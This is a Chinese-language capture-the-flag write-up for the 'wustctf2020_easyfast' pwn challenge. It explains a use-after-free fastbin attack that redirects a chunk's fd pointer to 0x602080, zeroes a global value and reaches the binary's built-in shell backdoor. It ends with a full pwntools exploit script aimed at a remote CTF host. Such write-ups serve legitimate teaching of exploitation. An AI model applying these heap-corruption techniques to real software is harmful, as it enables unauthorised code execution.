    checksec :

    ​ 简单逆向一下，有后门函数，当这个地址上储存的数小于等于0时getshell。整体的程序的话是一个没什么特别的菜单，free处有uaf，edit处能对堆指针任意写。

    ​ 首先逆向以后大体的思路是利用这个UAF进行0x602090的地址处的覆盖。

    ​ 所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。

    ​ 首先add再free两个chunk。

    add(0x40)
add(0x40)
free(0)
free(1)

    ​ 然后再将此时先被free的chunk的fd覆盖为0x602080

    ​

    ​ 此时连续add三个chunk，第三个就是我们需要的地址了

    from pwn import *

libc = ELF("/glibc/2.23/64/lib/libc-2.23.so")
context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"

if args['REMOTE']:
    p = remote("node4.buuoj.cn",27982)
else:
    p = process(["/glibc/2.23/64/lib/ld-2.23.so","./wustctf2020_easyfast"],env={"LD_PRELOAD" : "/glibc/2.23/64/lib/libc.so.6"})

def cmd(idx):
    p.recvuntil('choice>')
    p.sendline(str(idx))


def add(size):
    cmd(1)
    p.recvuntil('size>')
    p.sendline(str(size))


def free(idx):
    cmd(2)
    p.recvuntil('index>')
    p.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    p.recvuntil('index>')
    p.sendline(str(idx))
    p.sendline(content)
    
add(0x40)
add(0x40)
free(0)
free(1)
gdb.attach(p)
edit(0,p64(0x602080))
add(0x40)
add(0x40)
add(0x40)

edit(3,p64(0))
p.sendafter("choice>\n","4")
p.interactive()
